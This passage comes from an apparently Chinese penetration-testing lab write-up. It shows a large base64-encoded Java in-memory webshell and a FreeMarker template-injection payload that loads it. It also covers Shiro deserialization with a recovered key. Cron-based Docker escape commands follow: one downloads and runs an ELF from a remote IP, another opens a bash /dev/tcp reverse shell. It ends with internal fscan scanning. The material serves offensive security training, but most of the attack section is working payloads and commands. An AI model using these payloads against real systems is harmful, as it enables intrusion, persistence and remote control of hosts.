0ZXJOYW1lAQAjW0xqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjwqPjsHAPcBABFnZXRDYXRhbGluYUxvYWRlcgwBAACKCgACAQEMAOMA5AoAAgEDAQANZmluZEZpbHRlckRlZggBBQEAXShMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzcztbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAWwEHCgACAQgBAC9vcmcuYXBhY2hlLnRvbWNhdC51dGlsLmRlc2NyaXB0b3Iud2ViLkZpbHRlckRlZggBCgEAB2Zvck5hbWUMAQwAugoAfwENAQAvb3JnLmFwYWNoZS50b21jYXQudXRpbC5kZXNjcmlwdG9yLndlYi5GaWx0ZXJNYXAIAQ8BACRvcmcuYXBhY2hlLmNhdGFsaW5hLmRlcGxveS5GaWx0ZXJEZWYIAREBACRvcmcuYXBhY2hlLmNhdGFsaW5hLmRlcGxveS5GaWx0ZXJNYXAIARMBAD0oTGphdmEvbGFuZy9TdHJpbmc7WkxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KUxqYXZhL2xhbmcvQ2xhc3M7DAEMARUKAH8BFgEADXNldEZpbHRlck5hbWUIARgBAA5zZXRGaWx0ZXJDbGFzcwgBGgEADGFkZEZpbHRlckRlZggBHAEADXNldERpc3BhdGNoZXIIAR4BAAdSRVFVRVNUCAEgAQANYWRkVVJMUGF0dGVybggBIgwABQAGCgACASQBADBvcmcuYXBhY2hlLmNhdGFsaW5hLmNvcmUuQXBwbGljYXRpb25GaWx0ZXJDb25maWcIASYBABdnZXREZWNsYXJlZENvbnN0cnVjdG9ycwEAIigpW0xqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsMASgBKQoAfwEqAQANc2V0VVJMUGF0dGVybggBLAEAEmFkZEZpbHRlck1hcEJlZm9yZQgBLgEADGFkZEZpbHRlck1hcAgBMAEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yBwEyCgEzANYBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAOABNQoBMwE2CAD5AQANamF2YS91dGlsL01hcAcBOQEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAE7ATwLAToBPQEAD3ByaW50U3RhY2tUcmFjZQwBPwAZCgAbAUABACBqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbgcBQgEAIGphdmEvbGFuZy9JbnN0YW50aWF0aW9uRXhjZXB0aW9uBwFEAQABaQEADGRlY29kZXJDbGFzcwEAB2RlY29kZXIBAAdpZ25vcmVkAQAJYmFzZTY0U3RyAQAUTGphdmEvbGFuZy9DbGFzczwqPjsBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyCAFMAQAMZGVjb2RlQnVmZmVyCAFOAQAJZ2V0TWV0aG9kDAFQAM8KAH8BUQEAEGphdmEudXRpbC5CYXNlNjQIAVMBAApnZXREZWNvZGVyCAFVAQAGZGVjb2RlCAFXAQAOY29tcHJlc3NlZERhdGEBAANvdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQACaW4BAB5MamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbTsBAAZ1bmd6aXABAB9MamF2YS91dGlsL3ppcC9HWklQSW5wdXRTdHJlYW07AQAGYnVmZmVyAQABbgEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwFiAQAcamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbQcBZAEAHWphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtBwFmCgFjACwBAAUoW0IpVgwAFQFpCgFlAWoBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMABUBbAoBZwFtAQAEcmVhZAEABShbQilJDAFvAXAKAWcBcQEABXdyaXRlAQAHKFtCSUkpVgwBcwF0CgFjAXUBAAt0b0J5dGVBcnJheQEABCgpW0IMAXcBeAoBYwF5AQADb2JqAQAJZmllbGROYW1lAQAFZmllbGQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEZ2V0RgEAPyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9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</span><br></pre></td></tr></table></figure>

<p>这是我生成的冰蝎内存马：</p>
<img src="/posts/55d580db/image-20241210155448680.png" class="" title="image-20241210155448680">

<p>将编码后的内存马插入其中：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;sql&quot;:&quot;call$&#123;\&quot;freemarker.template.utility.ObjectConstructor\&quot;?new()(\&quot;javax.script.ScriptEngineManager\&quot;).getEngineByName(\&quot;js\&quot;).eval(\&quot;classLoader=java.lang.Thread.currentThread().getContextClassLoader();try&#123;classLoader.loadClass(&#x27;org.apachen.SOAPUtils&#x27;).newInstance();&#125;catch(e)&#123;clsString=classLoader.loadClass(&#x27;java.lang.String&#x27;);bytecodeBase64=&#x27;这里填入base64的内存马&#x27;;try&#123;clsBase64=classLoader.loadClass(&#x27;java.util.Base64&#x27;);clsDecoder=classLoader.loadClass(&#x27;java.util.Base64$Decoder&#x27;);decoder=clsBase64.getMethod(&#x27;getDecoder&#x27;).invoke(base64Clz);bytecode=clsDecoder.getMethod(&#x27;decode&#x27;,clsString).invoke(decoder,bytecodeBase64);&#125;catch(ee)&#123;try&#123;datatypeConverterClz=classLoader.loadClass(&#x27;javax.xml.bind.DatatypeConverter&#x27;);bytecode=datatypeConverterClz.getMethod(&#x27;parseBase64Binary&#x27;,clsString).invoke(datatypeConverterClz,bytecodeBase64);&#125;catch(eee)&#123;clazz1=classLoader.loadClass(&#x27;sun.misc.BASE64Decoder&#x27;);bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);&#125;&#125;clsClassLoader=classLoader.loadClass(&#x27;java.lang.ClassLoader&#x27;);clsByteArray=(&#x27;&#x27;.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod(&#x27;defineClass&#x27;,[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();&#125;;</span><br></pre></td></tr></table></figure>

<p>这里利用漏洞利用工具不能自动化打入内存马，于是自己尝试进行手工注入：</p>
<img src="/posts/55d580db/image-20241210155310487.png" class="" title="image-20241210155310487">

<p>成功打入冰蝎内存马以后：</p>
<img src="/posts/55d580db/image-20241210160858950.png" class="" title="image-20241210160858950">

<p>成功连接如下图：</p>
<img src="/posts/55d580db/image-20241210160936674.png" class="" title="image-20241210160936674">

<h3 id="10-10-0-3-Shiro-反序列化"><a href="#10-10-0-3-Shiro-反序列化" class="headerlink" title="10.10.0.3-Shiro 反序列化"></a>10.10.0.3-Shiro 反序列化</h3><p><code>http://10.10.0.3:18080/</code></p>
<p>成功拿到webshell以后发现有些命令没有，直接进行下一步的信息收集：</p>
<p>发现了<strong>DocToolkit</strong> 的源码，然后脱下来反编译</p>
<img src="/posts/55d580db/image-20241210161443869.png" class="" title="image-20241210161443869">

<p>利用<code>jadx工具</code>将jar包反编译：</p>
<img src="/posts/55d580db/image-20241210162800283.png" class="" title="image-20241210162800283">

<p>翻阅成功获得<code>shiro密钥</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QZIysgMYhG7/CzIJlVpR1g==</span><br></pre></td></tr></table></figure>

<p>打开one-fox内置的<code>shiro反序列化利用工具</code></p>
<p>检测成功：</p>
<img src="/posts/55d580db/image-20241210163614897.png" class="" title="image-20241210163614897">

<p>命令执行一手：</p>
<img src="/posts/55d580db/image-20241210163725995.png" class="" title="image-20241210163725995">

<p>注入内存马：</p>
<img src="/posts/55d580db/image-20241210163815545.png" class="" title="image-20241210163815545">

<h3 id="192-168-80-50-Docker容器逃逸"><a href="#192-168-80-50-Docker容器逃逸" class="headerlink" title="192.168.80.50-Docker容器逃逸"></a>192.168.80.50-Docker容器逃逸</h3><p>可看的相关文章:</p>
<p><code>https://xz.aliyun.com/t/12495?time__1311=GqGxRQq7qeuDlrzQ0%3DGOjqLb%3DAKKG8IeD</code></p>
<p>上传了一波fscan对内网进行了一番扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[*] LiveTop 172.18.0.0/16    段存活数量为: 2</span><br><span class="line">[*] LiveTop 172.18.0.0/24    段存活数量为: 2</span><br><span class="line">172.18.0.1:22 open</span><br><span class="line">172.18.0.2:8080 open</span><br><span class="line">172.18.0.1:6379 open</span><br><span class="line">172.18.0.1:3306 open</span><br><span class="line">172.18.0.1:18080 open</span><br><span class="line">172.18.0.1:18088 open</span><br><span class="line">[*] WebTitle http://172.18.0.2:8080    code:200 len:1120   title:DocToolkit</span><br><span class="line">[*] WebTitle http://172.18.0.1:18088   code:404 len:682    title:HTTP Status 404 – Not Found</span><br><span class="line">[*] WebTitle http://172.18.0.1:18080   code:200 len:1120   title:DocToolkit</span><br><span class="line">[+] mysql 172.18.0.1:3306:root root</span><br><span class="line">[+] Redis 172.18.0.1:6379 unauthorized file:/data/dump.rdb</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>感觉有一些不对劲，怀疑是在docker容器内：</p>
<p><code>find / -name .dockerenv</code></p>
<p>发现确实存在！！</p>
<p><code>df -h</code>发现(查看文件系统信息)</p>
<img src="/posts/55d580db/image-20241210171215786.png" class="" title="image-20241210171215786">

<p>基本确定就是在docker里面。</p>
<p><strong>逃逸docker容器常用方法</strong></p>
<ul>
<li><strong>内核漏洞：</strong>由于docker容器与物理机共享一个内核，当该内核存在内核漏洞时，在docker容器内利用内核漏洞可能直接获得物理机权限</li>
<li><strong>Docker API 未授权访问漏洞：</strong>当物理机的Docker API开启并同意未授权访问时，在Docker容器内可以使用Docker API新建一个Docker容器，并将物理机的根目录挂载到新Docker容器的某目录下。</li>
<li><strong>Docker容器以特权模式启动：</strong>当Docker容器以特权模式启动时，可以使用mount命令将物理机的根目录挂在道当前Docker容器的某目录下。</li>
</ul>
<p>用CDK工具检测docker容器是否有不安全的配置或漏洞存在</p>
<p><code>CDK地址：https://github.com/cdk-team/CDK</code></p>
<img src="/posts/55d580db/image-20241210164925808.png" class="" title="image-20241210164925808">

<p>查询cgroup进程:可以看出来就是docker环境了</p>
<img src="/posts/55d580db/image-20241210165121569.png" class="" title="image-20241210165121569">

<p>查看容器环境变量：非docker环境下是默认没有输出的，再次确认是docker环境下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/1/environ</span><br></pre></td></tr></table></figure>

<img src="/posts/55d580db/image-20241210165201238.png" class="" title="image-20241210165201238">

<p>内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/binHOSTNAME=25313452973fFLAG=flag&#123;N1c3_sHirO_fuCK&#125;LANG=C.UTF-8JAVA_HOME=/usr/lib/jvm/java-1.8-openjdkJAVA_VERSION=8u212JAVA_ALPINE_VERSION=8.212.04-r0HOME=/rootLD_LIBRARY_PATH=/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjdk/jre/../lib/amd64</span><br></pre></td></tr></table></figure>

<p>上传cdk工具进行查询结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /tmp/cdk_linux_amd64</span><br><span class="line">/tmp/cdk_linux_amd64 evaluate --full</span><br></pre></td></tr></table></figure>

<img src="/posts/55d580db/image-20241210165803609.png" class="" title="image-20241210165803609">

<p>不过好像并无卵用，又或者说我还不太会用哈哈哈哈。</p>
<p>经过一番翻阅：</p>
<p>发现了挂载目录：&#x2F;dev&#x2F;tmp</p>
<p>发现挂载的是宿主机的目录</p>
<img src="/posts/55d580db/image-20241210171610129.png" class="" title="image-20241210171610129">

<p>我们会发现其真实机的目录内容就在我们的这个docker容器内：所以往这个目录传即可：</p>
<img src="/posts/55d580db/image-20241211001219313.png" class="" title="image-20241211001219313">

<p>挂载进行定时任务逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;*/1 * * * * root wget http://公网ip:9999/icon_54321.elf -o /tmp/qwert1234&quot; &gt; /dev/tmp/etc/cron.d/sysstat</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;*/1 * * * * root chmod 755 /tmp/qwert1234&quot; &gt; /dev/tmp/etc/cron.d/sysstat</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;*/1 * * * * root /tmp/qwert1234&quot; &gt; /dev/tmp/etc/cron.d/sysstat</span><br></pre></td></tr></table></figure>



<p>或者挂载进行定时任务反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;*/1 * * * * root bash -c &quot;bash -i &gt;&amp; /dev/tcp/公网IP/9999 0&gt;&amp;1&quot; &#x27; &gt; /dev/tmp/etc/cron.d/sysstat</span><br></pre></td></tr></table></figure>

<p>等待一分钟 就收到shell了</p>
<img src="/posts/55d580db/image-20241211111258967.png" class="" title="image-20241211111258967">

<img src="/posts/55d580db/image-20241211111028534.png" class="" title="image-20241211111028534">

<img src="/posts/55d580db/image-20241211111134260.png" class="" title="image-20241211111134260">



<p>当然你也可以直接在这里写一个shell脚本然后利用定时任务进行逃逸如下：不做过多演示。</p>
<img src="/posts/55d580db/image-20241210172141145.png" class="" title="image-20241210172141145">

<p>成功反弹shell以后：我们发现了其的真实网卡：</p>
<img src="/posts/55d580db/image-20241211001013951.png" class="" title="image-20241211001013951">



<p>逃逸到主机以后利用<code>venom</code>工具先快捷搭建一个代理将自己代理进内网网段<code>192.168.80.50/24</code></p>
<h3 id="192-168-80-55-文件上传绕WAF"><a href="#192-168-80-55-文件上传绕WAF" class="headerlink" title="192.168.80.55-文件上传绕WAF"></a>192.168.80.55-文件上传绕WAF</h3><p>上传工具：<code>fscan</code>,<code>chfs</code>工具，利用fscan对其内网进行扫描</p>
<img src="/posts/55d580db/image-20241211115257465.png" class="" title="image-20241211115257465">

<p>发现一台内网主机:<strong>192.168.80.55</strong>并且其开放了80端口</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 192.168.80.0/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start 